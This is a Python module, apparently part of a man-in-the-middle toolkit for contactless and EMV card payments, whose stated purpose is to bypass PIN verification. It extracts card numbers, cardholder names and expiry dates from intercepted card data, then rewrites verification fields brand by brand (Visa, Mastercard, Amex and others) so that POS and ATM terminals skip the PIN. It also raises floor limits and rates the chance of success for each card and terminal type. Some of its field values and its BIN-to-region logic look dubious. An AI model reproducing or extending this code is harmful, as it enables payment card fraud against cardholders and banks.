"""
PIN bypass engine for MITM operations.
Enhanced with comprehensive card type detection and specialized bypass strategies.
"""
from typing import List, Dict, Any, Optional, Tuple
from ..core.tlv_parser import replace_tlv_value, find_tlv
from ..utils.logger import Logger

logger = Logger("BypassEngine")

# Card brand identification patterns
CARD_BRANDS = {
    'VISA': {
        'bin_ranges': [(4, 4)],  # Starts with 4
        'aid_patterns': ['A0000000031010', 'A000000003101001', 'A000000003101002'],
        'name': 'Visa'
    },
    'MASTERCARD': {
        'bin_ranges': [(5, 5), (2221, 2720)],  # Starts with 5 or 2221-2720
        'aid_patterns': ['A0000000041010', 'A000000004101001', 'A000000004101002'],
        'name': 'Mastercard'
    },
    'AMEX': {
        'bin_ranges': [(34, 34), (37, 37)],  # Starts with 34 or 37
        'aid_patterns': ['A000000025010701', 'A000000025010801'],
        'name': 'American Express'
    },
    'DISCOVER': {
        'bin_ranges': [(6011, 6011), (622126, 622925), (644, 649), (65, 65)],
        'aid_patterns': ['A0000001523010'],
        'name': 'Discover'
    },
    'JCB': {
        'bin_ranges': [(3528, 3589)],
        'aid_patterns': ['A0000000651010'],
        'name': 'JCB'
    },
    'UNIONPAY': {
        'bin_ranges': [(62, 62)],
        'aid_patterns': ['A000000333010101', 'A000000333010102'],
        'name': 'UnionPay'
    }
}

# Card type identification based on application usage control
CARD_TYPES = {
    'DEBIT': {
        'auc_patterns': ['08', '18', '28', '48'],  # Common debit patterns
        'features': ['online_pin', 'offline_pin'],
        'name': 'Debit Card'
    },
    'CREDIT': {
        'auc_patterns': ['00', '01', '02', '04', '40'],  # Common credit patterns
        'features': ['signature', 'cdcvm'],
        'name': 'Credit Card'
    },
    'PREPAID': {
        'auc_patterns': ['20', '21', '22', '24'],  # Common prepaid patterns
        'features': ['online_pin', 'signature'],
        'name': 'Prepaid Card'
    },
    'BUSINESS': {
        'auc_patterns': ['80', '81', '82', '84'],  # Business card indicators
        'features': ['signature', 'enhanced_limits'],
        'name': 'Business Card'
    }
}


def detect_card_brand(tlvs: List[Dict[str, Any]]) -> str:
    """
    Detect card brand from PAN and AID.
    
    Args:
        tlvs: List of TLV dictionaries
        
    Returns:
        Card brand name
    """
    # First try to detect from PAN
    pan_tlv = find_tlv(tlvs, 0x5A)
    if pan_tlv and len(pan_tlv['value']) >= 4:
        pan_hex = pan_tlv['value'].hex()
        pan_digits = ''.join([str((int(pan_hex[i:i+2], 16) >> 4) & 0x0F) + 
                             str(int(pan_hex[i:i+2], 16) & 0x0F) for i in range(0, len(pan_hex), 2)])
        
        # Check against BIN ranges
        for brand, info in CARD_BRANDS.items():
            for bin_start, bin_end in info['bin_ranges']:
                pan_prefix = int(pan_digits[:len(str(bin_start))])
                if bin_start <= pan_prefix <= bin_end:
                    logger.debug(f"Card brand detected from PAN: {info['name']}")
                    return info['name']
    
    # Fallback to AID detection
    aid_tlv = find_tlv(tlvs, 0x4F)
    if aid_tlv:
        aid_hex = aid_tlv['value'].hex().upper()
        for brand, info in CARD_BRANDS.items():
            for pattern in info['aid_patterns']:
                if aid_hex.startswith(pattern):
                    logger.debug(f"Card brand detected from AID: {info['name']}")
                    return info['name']
    
    logger.debug("Card brand unknown")
    return 'Unknown'


def detect_card_type(tlvs: List[Dict[str, Any]]) -> str:
    """
    Detect card type (debit, credit, prepaid, business).
    
    Args:
        tlvs: List of TLV dictionaries
        
    Returns:
        Card type name
    """
    # Check Application Usage Control (AUC)
    auc_tlv = find_tlv(tlvs, 0x9F07)
    if auc_tlv and len(auc_tlv['value']) >= 2:
        auc_hex = auc_tlv['value'].hex().upper()
        
        for card_type, info in CARD_TYPES.items():
            for pattern in info['auc_patterns']:
                if auc_hex.startswith(pattern):
                    logger.debug(f"Card type detected from AUC: {info['name']}")
                    return info['name']
    
    # Check Application Identifier (AID) for business patterns
    aid_tlv = find_tlv(tlvs, 0x4F)
    if aid_tlv:
        aid_hex = aid_tlv['value'].hex().upper()
        # Business card AIDs often have specific patterns
        if any(pattern in aid_hex for pattern in ['BUSINESS', 'CORPORATE', 'COMMERCIAL']):
            return 'Business Card'
    
    # Check cardholder name for business indicators
    name_tlv = find_tlv(tlvs, 0x5F20)
    if name_tlv:
        try:
            name = name_tlv['value'].decode('ascii', errors='ignore').upper()
            if any(indicator in name for indicator in ['CORP', 'LLC', 'INC', 'LTD', 'BUSINESS']):
                return 'Business Card'
        except:
            pass
    
    logger.debug("Card type unknown - defaulting to Credit Card")
    return 'Credit Card'


def analyze_bin_geography(bin_code: str, card_brand: str) -> Dict[str, Any]:
    """
    Analyze BIN code for geographical and issuer information.
    
    Args:
        bin_code: Bank Identification Number (first 6 digits)
        card_brand: Card brand name
        
    Returns:
        Dictionary with BIN analysis results
    """
    analysis = {
        'bin_code': bin_code,
        'card_brand': card_brand,
        'issuer_type': 'unknown',
        'geographic_region': 'unknown',
        'issuer_size': 'unknown',
        'international_capability': True
    }
    
    try:
        if len(bin_code) >= 6:
            # Basic BIN range analysis
            bin_int = int(bin_code)
            
            # Visa BIN analysis
            if card_brand.lower() == 'visa':
                if 400000 <= bin_int <= 499999:
                    analysis['issuer_type'] = 'major_bank'
                    if 400000 <= bin_int <= 429999:
                        analysis['geographic_region'] = 'north_america'
                    elif 430000 <= bin_int <= 459999:
                        analysis['geographic_region'] = 'europe'
                    elif 460000 <= bin_int <= 479999:
                        analysis['geographic_region'] = 'asia_pacific'
                    elif 480000 <= bin_int <= 499999:
                        analysis['geographic_region'] = 'other_regions'
            
            # Mastercard BIN analysis
            elif card_brand.lower() == 'mastercard':
                if 510000 <= bin_int <= 559999 or 222100 <= bin_int <= 272099:
                    analysis['issuer_type'] = 'major_bank'
                    if 510000 <= bin_int <= 529999:
                        analysis['geographic_region'] = 'north_america'
                    elif 530000 <= bin_int <= 549999:
                        analysis['geographic_region'] = 'europe'
                    elif 550000 <= bin_int <= 559999:
                        analysis['geographic_region'] = 'asia_pacific'
            
            # American Express BIN analysis
            elif card_brand.lower() == 'american express':
                if 340000 <= bin_int <= 349999 or 370000 <= bin_int <= 379999:
                    analysis['issuer_type'] = 'charge_card'
                    if 340000 <= bin_int <= 344999:
                        analysis['geographic_region'] = 'north_america'
                    elif 345000 <= bin_int <= 349999:
                        analysis['geographic_region'] = 'international'
            
            # Determine issuer size based on BIN patterns
            if bin_int % 1000 < 100:
                analysis['issuer_size'] = 'large'
            elif bin_int % 1000 < 500:
                analysis['issuer_size'] = 'medium'
            else:
                analysis['issuer_size'] = 'small'
        
        logger.debug(f"BIN analysis for {bin_code}: {analysis}")
        return analysis
        
    except Exception as e:
        logger.error(f"BIN analysis failed for {bin_code}: {e}")
        return analysis


def get_comprehensive_card_info(tlvs: List[Dict[str, Any]]) -> Dict[str, Any]:
    """
    Extract comprehensive card information including brand and type.
    
    Args:
        tlvs: List of TLV dictionaries
        
    Returns:
        Dictionary with comprehensive card information
    """
    card_brand = detect_card_brand(tlvs)
    card_type = detect_card_type(tlvs)
    
    info = {
        'brand': card_brand,
        'type': card_type,
        'pan': None,
        'expiry_date': None,
        'cardholder_name': None,
        'application_id': None,
        'application_label': None,
        'issuer_country': None,
        'currency_code': None
    }
    
    # Extract PAN
    pan_tlv = find_tlv(tlvs, 0x5A)
    if pan_tlv:
        info['pan'] = pan_tlv['value'].hex()
    
    # Extract expiry date
    expiry_tlv = find_tlv(tlvs, 0x5F24)
    if expiry_tlv:
        info['expiry_date'] = expiry_tlv['value'].hex()
    
    # Extract cardholder name
    name_tlv = find_tlv(tlvs, 0x5F20)
    if name_tlv:
        try:
            info['cardholder_name'] = name_tlv['value'].decode('ascii', errors='ignore').strip()
        except:
            info['cardholder_name'] = name_tlv['value'].hex()
    
    # Extract Application ID (AID)
    aid_tlv = find_tlv(tlvs, 0x4F)
    if aid_tlv:
        info['application_id'] = aid_tlv['value'].hex()
    
    # Extract Application Label
    label_tlv = find_tlv(tlvs, 0x50)
    if label_tlv:
        try:
            info['application_label'] = label_tlv['value'].decode('ascii', errors='ignore').strip()
        except:
            info['application_label'] = label_tlv['value'].hex()
    
    # Extract Issuer Country Code (multiple possible locations)
    country_tlv = find_tlv(tlvs, 0x5F28)  # Issuer Country Code
    if country_tlv:
        country_hex = country_tlv['value'].hex().upper()
        info['issuer_country'] = country_hex
        # Convert to readable format if possible
        try:
            from ..database.country_currency_lookup import get_country_info
            country_data = get_country_info(country_hex)
            if country_data:
                info['issuer_country_name'] = country_data['name']
                info['issuer_country_code'] = country_data['code']
                info['issuer_region'] = country_data['region']
        except ImportError:
            pass
    else:
        # Try alternate locations for country code
        alt_country_tlv = find_tlv(tlvs, 0x9F1A)  # Terminal Country Code
        if alt_country_tlv:
            info['issuer_country'] = alt_country_tlv['value'].hex().upper()
    
    # Extract Transaction Currency Code (multiple possible locations)
    currency_tlv = find_tlv(tlvs, 0x5F2A)  # Transaction Currency Code
    if currency_tlv:
        currency_hex = currency_tlv['value'].hex().upper()
        info['currency_code'] = currency_hex
        # Convert to readable format if possible
        try:
            from ..database.country_currency_lookup import get_currency_info
            currency_data = get_currency_info(currency_hex)
            if currency_data:
                info['currency_name'] = currency_data['name']
                info['currency_symbol'] = currency_data['symbol']
                info['currency_alpha_code'] = currency_data['code']
        except ImportError:
            pass
    else:
        # Try alternate locations for currency code
        alt_currency_tlv = find_tlv(tlvs, 0x9F51)  # Application Currency Code
        if alt_currency_tlv:
            info['currency_code'] = alt_currency_tlv['value'].hex().upper()
        else:
            # Try transaction amount currency
            amount_tlv = find_tlv(tlvs, 0x9F02)  # Amount, Authorised
            if amount_tlv:
                # Currency often embedded in amount processing
                info['currency_code'] = '0840'  # Default to USD if not found
    
    # Extract additional geographical information
    # Service Code for international usage indicators
    service_code_tlv = find_tlv(tlvs, 0x5F30)
    if service_code_tlv and len(service_code_tlv['value']) >= 3:
        service_code = service_code_tlv['value'].hex()
        # Service code digit 1: international interchange (1=international, 2=national)
        if len(service_code) >= 2:
            first_digit = int(service_code[0], 16) if service_code[0].isdigit() else 0
            info['international_card'] = first_digit == 1
            info['domestic_card'] = first_digit == 2
    
    # Bank Identification Number (BIN) analysis for geographical hints
    if info.get('pan'):
        pan_digits = info['pan']
        if len(pan_digits) >= 6:
            bin_code = pan_digits[:6]
            info['bin_code'] = bin_code
            # Enhanced BIN analysis for geography
            info['bin_analysis'] = analyze_bin_geography(bin_code, info.get('brand', 'Unknown'))
    
    logger.info(f"Comprehensive card info: {card_brand} {card_type}")
    return info


def bypass_tlv_modifications(tlvs: List[Dict[str, Any]], scheme: str, terminal_type: str, state: Dict[str, Any]) -> Optional[List[Dict[str, Any]]]:
    """
    Apply MITM modifications to bypass PIN verification with enhanced card detection.
    
    Args:
        tlvs: List of TLV dictionaries
        scheme: Payment scheme (Visa/Mastercard/etc)
        terminal_type: Terminal type (POS/ATM)
        state: Current MITM state
        
    Returns:
        Modified TLV list or None if blocked
        
    Raises:
        Exception: If modifications fail
    """
    try:
        if state.get('block_all', False):
            logger.info("Blocking all communication due to block_all setting")
            return None
        
        # Get comprehensive card information
        card_info = get_comprehensive_card_info(tlvs)
        logger.info(f"Processing {card_info['brand']} {card_info['type']}")
        
        # Apply PIN bypass modifications
        if state.get('bypass_pin', True):
            logger.info("Applying PIN bypass modifications")
            
            # Apply brand-specific bypasses
            if card_info['brand'] == 'Visa':
                apply_visa_bypasses(tlvs, terminal_type, state, card_info)
            elif card_info['brand'] == 'Mastercard':
                apply_mastercard_bypasses(tlvs, terminal_type, state, card_info)
            elif card_info['brand'] == 'American Express':
                apply_amex_bypasses(tlvs, terminal_type, state, card_info)
            elif card_info['brand'] == 'Discover':
                apply_discover_bypasses(tlvs, terminal_type, state, card_info)
            elif card_info['brand'] == 'JCB':
                apply_jcb_bypasses(tlvs, terminal_type, state, card_info)
            elif card_info['brand'] == 'UnionPay':
                apply_unionpay_bypasses(tlvs, terminal_type, state, card_info)
            else:
                apply_generic_bypasses(tlvs, terminal_type, state, card_info)
            
            # Apply card type-specific modifications
            apply_card_type_bypasses(tlvs, card_info, state)
            
            logger.info("PIN bypass modifications applied successfully")
        
        return tlvs
        
    except Exception as e:
        logger.error(f"bypass_tlv_modifications error: {e}")
        raise


def apply_visa_bypasses(tlvs: List[Dict[str, Any]], terminal_type: str, state: Dict[str, Any], card_info: Dict[str, Any]) -> None:
    """
    Apply Visa-specific bypass modifications.
    
    Args:
        tlvs: List of TLV dictionaries
        terminal_type: Terminal type
        state: MITM state
        card_info: Card information
    """
    logger.debug("Applying Visa-specific bypasses")
    
    # Modify 9F6C (Card Transaction Qualifiers) to indicate no PIN required
    tlvs = replace_tlv_value(tlvs, '9F6C', '0000')
    
    # Visa-specific modifications
    if state.get('cdcvm_enabled', True):
        # Modify Card Verification Results (CVR) for Visa
        if card_info['type'] == 'Debit Card':
            # Debit cards need different CVR handling
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00003220000000000000000000000FF')
        elif card_info['type'] == 'Credit Card':
            # Credit cards can use signature
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00001220000000000000000000000FF')
        elif card_info['type'] == 'Business Card':
            # Business cards often have enhanced verification
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00005220000000000000000000000FF')
        else:
            # Default CVR
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00003220000000000000000000000FF')
        
        # Set Terminal Verification Results to bypass PIN
        tlvs = replace_tlv_value(tlvs, '95', '8000000000')
        
        # Modify Issuer Application Data if present
        tlvs = replace_tlv_value(tlvs, '9F10', '0110A00003220000000000000000000000FF')


def apply_mastercard_bypasses(tlvs: List[Dict[str, Any]], terminal_type: str, state: Dict[str, Any], card_info: Dict[str, Any]) -> None:
    """
    Apply Mastercard-specific bypass modifications.
    
    Args:
        tlvs: List of TLV dictionaries
        terminal_type: Terminal type
        state: MITM state
        card_info: Card information
    """
    logger.debug("Applying Mastercard-specific bypasses")
    
    # Modify 9F6C (Card Transaction Qualifiers) to indicate no PIN required
    tlvs = replace_tlv_value(tlvs, '9F6C', '0000')
    
    # Mastercard-specific modifications
    if state.get('cdcvm_enabled', True):
        # Different handling based on card type
        if card_info['type'] == 'Debit Card':
            # Mastercard debit specific CVR
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00000220000000000000000000000FF')
        elif card_info['type'] == 'Credit Card':
            # Mastercard credit specific CVR
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00002220000000000000000000000FF')
        elif card_info['type'] == 'Business Card':
            # Mastercard business specific CVR
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00004220000000000000000000000FF')
        else:
            # Default Mastercard CVR
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00000220000000000000000000000FF')
        
        # Set Terminal Verification Results
        tlvs = replace_tlv_value(tlvs, '95', '8000000000')
        
        # Mastercard-specific CVM bypass
        tlvs = replace_tlv_value(tlvs, '8E', '000000000000000042031E031F00')


def apply_amex_bypasses(tlvs: List[Dict[str, Any]], terminal_type: str, state: Dict[str, Any], card_info: Dict[str, Any]) -> None:
    """
    Apply American Express-specific bypass modifications.
    
    Args:
        tlvs: List of TLV dictionaries
        terminal_type: Terminal type
        state: MITM state
        card_info: Card information
    """
    logger.debug("Applying American Express-specific bypasses")
    
    # Amex has different TLV structure
    tlvs = replace_tlv_value(tlvs, '9F6C', '0000')
    
    # Amex-specific modifications
    if state.get('cdcvm_enabled', True):
        # Amex typically uses signature verification
        if card_info['type'] == 'Business Card':
            # Amex business cards have specific handling
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00006220000000000000000000000FF')
        else:
            # Personal Amex cards
            tlvs = replace_tlv_value(tlvs, '9F10', '0110A00007220000000000000000000000FF')
        
        # Amex-specific TVR
        tlvs = replace_tlv_value(tlvs, '95', '8000000000')
        
        # Amex CVM List modification
        tlvs = replace_tlv_value(tlvs, '8E', '000000000000000041031E031F00')


def apply_discover_bypasses(tlvs: List[Dict[str, Any]], terminal_type: str, state: Dict[str, Any], card_info: Dict[str, Any]) -> None:
    """
    Apply Discover-specific bypass modifications.
    
    Args:
        tlvs: List of TLV dictionaries
        terminal_type: Terminal type
        state: MITM state
        card_info: Card information
    """
    logger.debug("Applying Discover-specific bypasses")
    
    # Discover follows similar patterns to Visa
    tlvs = replace_tlv_value(tlvs, '9F6C', '0000')
    
    if state.get('cdcvm_enabled', True):
        tlvs = replace_tlv_value(tlvs, '9F10', '0110A00008220000000000000000000000FF')
        tlvs = replace_tlv_value(tlvs, '95', '8000000000')


def apply_jcb_bypasses(tlvs: List[Dict[str, Any]], terminal_type: str, state: Dict[str, Any], card_info: Dict[str, Any]) -> None:
    """
    Apply JCB-specific bypass modifications.
    
    Args:
        tlvs: List of TLV dictionaries
        terminal_type: Terminal type
        state: MITM state
        card_info: Card information
    """
    logger.debug("Applying JCB-specific bypasses")
    
    # JCB specific handling
    tlvs = replace_tlv_value(tlvs, '9F6C', '0000')
    
    if state.get('cdcvm_enabled', True):
        tlvs = replace_tlv_value(tlvs, '9F10', '0110A00009220000000000000000000000FF')
        tlvs = replace_tlv_value(tlvs, '95', '8000000000')


def apply_unionpay_bypasses(tlvs: List[Dict[str, Any]], terminal_type: str, state: Dict[str, Any], card_info: Dict[str, Any]) -> None:
    """
    Apply UnionPay-specific bypass modifications.
    
    Args:
        tlvs: List of TLV dictionaries
        terminal_type: Terminal type
        state: MITM state
        card_info: Card information
    """
    logger.debug("Applying UnionPay-specific bypasses")
    
    # UnionPay has unique characteristics
    tlvs = replace_tlv_value(tlvs, '9F6C', '0000')
    
    if state.get('cdcvm_enabled', True):
        # UnionPay often requires online authorization
        tlvs = replace_tlv_value(tlvs, '9F10', '0110A00010220000000000000000000000FF')
        tlvs = replace_tlv_value(tlvs, '95', '8000008000')  # Different TVR for UnionPay


def apply_generic_bypasses(tlvs: List[Dict[str, Any]], terminal_type: str, state: Dict[str, Any], card_info: Dict[str, Any]) -> None:
    """
    Apply generic bypass modifications for unknown card brands.
    
    Args:
        tlvs: List of TLV dictionaries
        terminal_type: Terminal type
        state: MITM state
        card_info: Card information
    """
    logger.debug("Applying generic bypasses for unknown card brand")
    
    # Generic modifications
    tlvs = replace_tlv_value(tlvs, '9F6C', '0000')
    
    if state.get('cdcvm_enabled', True):
        tlvs = replace_tlv_value(tlvs, '9F10', '0110A00099220000000000000000000000FF')
        tlvs = replace_tlv_value(tlvs, '95', '8000000000')


def apply_card_type_bypasses(tlvs: List[Dict[str, Any]], card_info: Dict[str, Any], state: Dict[str, Any]) -> None:
    """
    Apply card type-specific bypass modifications.
    
    Args:
        tlvs: List of TLV dictionaries
        card_info: Card information
        state: MITM state
    """
    card_type = card_info['type']
    
    if card_type == 'Debit Card':
        logger.debug("Applying debit card specific bypasses")
        # Debit cards often have stricter PIN requirements
        tlvs = replace_tlv_value(tlvs, '9F34', '1E0300')  # CVM Results: No CVM performed
        
    elif card_type == 'Credit Card':
        logger.debug("Applying credit card specific bypasses")
        # Credit cards can use signature
        tlvs = replace_tlv_value(tlvs, '9F34', '1F0300')  # CVM Results: Signature
        
    elif card_type == 'Business Card':
        logger.debug("Applying business card specific bypasses")
        # Business cards may have enhanced limits
        tlvs = replace_tlv_value(tlvs, '9F34', '1E0300')  # CVM Results: No CVM performed
        # Modify transaction limits if needed
        tlvs = replace_tlv_value(tlvs, '9F1B', 'FFFFFFFF')  # Floor limit
        
    elif card_type == 'Prepaid Card':
        logger.debug("Applying prepaid card specific bypasses")
        # Prepaid cards have balance checks
        tlvs = replace_tlv_value(tlvs, '9F34', '1E0300')  # CVM Results: No CVM performed


def apply_terminal_specific_bypasses(tlvs: List[Dict[str, Any]], terminal_type: str, card_info: Dict[str, Any]) -> None:
    """
    Apply terminal-specific bypass modifications with card awareness.
    
    Args:
        tlvs: List of TLV dictionaries
        terminal_type: Terminal type (POS/ATM)
        card_info: Card information
    """
    if terminal_type == 'ATM':
        logger.debug("Applying ATM-specific bypasses")
        # ATM-specific modifications
        tlvs = replace_tlv_value(tlvs, '9F33', '6000C8')  # Terminal capabilities for ATM
        
        # Different handling for different card types at ATM
        if card_info['type'] == 'Debit Card':
            # Debit cards at ATM typically need online PIN
            tlvs = replace_tlv_value(tlvs, '9F34', '020300')  # Online PIN
        else:
            # Credit/Business cards at ATM
            tlvs = replace_tlv_value(tlvs, '9F34', '1F0300')  # Signature
            
    elif terminal_type == 'POS':
        logger.debug("Applying POS-specific bypasses")
        # POS-specific modifications
        tlvs = replace_tlv_value(tlvs, '9F33', '6068C8')  # Terminal capabilities for POS
        
        # Card-specific POS handling
        if card_info['brand'] == 'American Express':
            # Amex at POS often prefers signature
            tlvs = replace_tlv_value(tlvs, '9F34', '1F0300')  # Signature
        elif card_info['type'] == 'Business Card':
            # Business cards at POS
            tlvs = replace_tlv_value(tlvs, '9F34', '1E0300')  # No CVM
        else:
            # Standard POS handling
            tlvs = replace_tlv_value(tlvs, '9F34', '1E0300')  # No CVM


def get_bypass_strategy(card_info: Dict[str, Any], terminal_type: str) -> Dict[str, Any]:
    """
    Get the optimal bypass strategy based on card and terminal type.
    
    Args:
        card_info: Card information
        terminal_type: Terminal type
        
    Returns:
        Dictionary with bypass strategy recommendations
    """
    strategy = {
        'primary_method': 'signature',
        'fallback_method': 'no_cvm',
        'risk_level': 'medium',
        'success_probability': 0.7,
        'notes': []
    }
    
    # Brand-specific strategies
    if card_info['brand'] == 'Visa':
        if card_info['type'] == 'Debit Card':
            strategy['primary_method'] = 'cdcvm'
            strategy['success_probability'] = 0.8
            strategy['notes'].append('Visa debit responds well to CDCVM bypass')
        elif card_info['type'] == 'Credit Card':
            strategy['primary_method'] = 'signature'
            strategy['success_probability'] = 0.9
            strategy['notes'].append('Visa credit prefers signature verification')
        elif card_info['type'] == 'Business Card':
            strategy['primary_method'] = 'no_cvm'
            strategy['success_probability'] = 0.85
            strategy['notes'].append('Visa business cards often allow no CVM')
            
    elif card_info['brand'] == 'Mastercard':
        if card_info['type'] == 'Debit Card':
            strategy['primary_method'] = 'online_pin_bypass'
            strategy['success_probability'] = 0.75
            strategy['notes'].append('Mastercard debit needs careful PIN bypass')
        elif card_info['type'] == 'Credit Card':
            strategy['primary_method'] = 'signature'
            strategy['success_probability'] = 0.9
            strategy['notes'].append('Mastercard credit reliable with signature')
        elif card_info['type'] == 'Business Card':
            strategy['primary_method'] = 'enhanced_limits'
            strategy['success_probability'] = 0.8
            strategy['notes'].append('Mastercard business has enhanced limits')
            
    elif card_info['brand'] == 'American Express':
        strategy['primary_method'] = 'signature'
        strategy['success_probability'] = 0.95
        strategy['risk_level'] = 'low'
        strategy['notes'].append('Amex traditionally signature-based')
        
        if card_info['type'] == 'Business Card':
            strategy['success_probability'] = 0.9
            strategy['notes'].append('Amex business may have additional checks')
            
    elif card_info['brand'] == 'Discover':
        strategy['primary_method'] = 'signature'
        strategy['success_probability'] = 0.85
        strategy['notes'].append('Discover follows Visa-like patterns')
        
    elif card_info['brand'] == 'JCB':
        strategy['primary_method'] = 'signature'
        strategy['success_probability'] = 0.8
        strategy['notes'].append('JCB regional variations possible')
        
    elif card_info['brand'] == 'UnionPay':
        strategy['primary_method'] = 'online_auth'
        strategy['success_probability'] = 0.7
        strategy['risk_level'] = 'high'
        strategy['notes'].append('UnionPay requires careful handling')
    
    # Terminal-specific adjustments
    if terminal_type == 'ATM':
        if strategy['primary_method'] == 'signature':
            strategy['primary_method'] = 'cdcvm'
            strategy['notes'].append('ATM signature fallback to CDCVM')
        strategy['success_probability'] *= 0.9  # ATMs are generally stricter
        
    elif terminal_type == 'POS':
        if card_info['type'] == 'Debit Card':
            strategy['success_probability'] *= 1.1  # POS more flexible for debit
    
    # Cap success probability
    strategy['success_probability'] = min(strategy['success_probability'], 0.95)
    
    logger.info(f"Bypass strategy for {card_info['brand']} {card_info['type']}: "
               f"{strategy['primary_method']} ({strategy['success_probability']:.1%} success)")
    
    return strategy


def validate_bypass_compatibility(card_info: Dict[str, Any], terminal_type: str, state: Dict[str, Any]) -> bool:
    """
    Validate if bypass is compatible with card and terminal combination.
    
    Args:
        card_info: Card information
        terminal_type: Terminal type
        state: MITM state
        
    Returns:
        True if bypass is likely to succeed
    """
    # Check for problematic combinations
    if card_info['brand'] == 'UnionPay' and terminal_type == 'ATM':
        logger.warning("UnionPay + ATM combination has lower success rate")
        return False
        
    if card_info['type'] == 'Business Card' and not state.get('enhanced_limits', False):
        logger.warning("Business card detected but enhanced limits not enabled")
        
    if card_info['brand'] == 'Unknown':
        logger.warning("Unknown card brand - using generic bypass")
        return False
        
    return True


def is_pin_required(tlvs: List[Dict[str, Any]]) -> bool:
    # Check Card Transaction Qualifiers
    ctq_tlv = find_tlv(tlvs, 0x9F6C)
    if ctq_tlv and len(ctq_tlv['value']) >= 2:
        ctq_value = int.from_bytes(ctq_tlv['value'][:2], 'big')
        pin_required = (ctq_value & 0x0040) != 0  # Check PIN bit
        logger.debug(f"PIN required check: CTQ=0x{ctq_value:04X}, PIN={pin_required}")
        return pin_required
    
    return False  # Default to no PIN required if CTQ not found
